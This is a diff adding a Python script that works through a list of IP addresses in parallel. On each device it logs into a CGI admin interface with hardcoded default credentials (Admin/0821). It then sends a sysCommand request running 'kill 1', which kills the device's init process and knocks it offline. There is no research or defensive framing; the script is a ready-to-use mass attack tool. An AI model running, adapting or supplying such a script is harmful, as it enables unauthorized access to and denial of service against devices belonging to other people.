@@ -1,0 +1,44 @@
+import requests
+import concurrent.futures
+
+def check_login(ip_port):
+    url_login = f"http://{ip_port}/cgi-bin/systemutil.cgi"
+    url_get_request = f"http://{ip_port}/cgi-bin/admin.cgi?Command=sysCommand&Cmd=kill%201&T=1704455597279"
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
+        "Connection": "close",
+    }
+    payload_login = "Command=Login&user=Admin&password=0821&T=1704453374058"
+
+    try:
+        # Send login request
+        response_login = requests.post(url_login, headers=headers, data=payload_login, timeout=timeout_value)
+
+        # Check if the login was successful
+        if response_login.status_code == 200 and "<Login>2</Login>" in response_login.text:
+            print(f"[+] configuration modified using id-0: {ip_port}")
+
+            # Send additional GET request after successful login
+            response_get_request = requests.get(url_get_request, headers=headers, timeout=timeout_value)
+
+            # Uncomment these lines if you want to print the GET response
+            # print(f"GET Response for: {ip_port}")
+            # print(response_get_request.text)
+
+    except requests.exceptions.Timeout:
+        pass  # Do nothing on timeout
+    except Exception as e:
+        pass  # Do nothing on other exceptions
+
+# Read IPs from ips.txt
+with open("ips.txt", "r") as file:
+    ips = [ip.strip() for ip in file.readlines()]
+
+# Adjust these values as needed
+num_threads = 5  # Set the number of threads
+timeout_value = 5  # Set the timeout value in seconds
+
+# Use ThreadPoolExecutor for threading with the specified number of threads
+with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+    executor.map(check_login, ips)
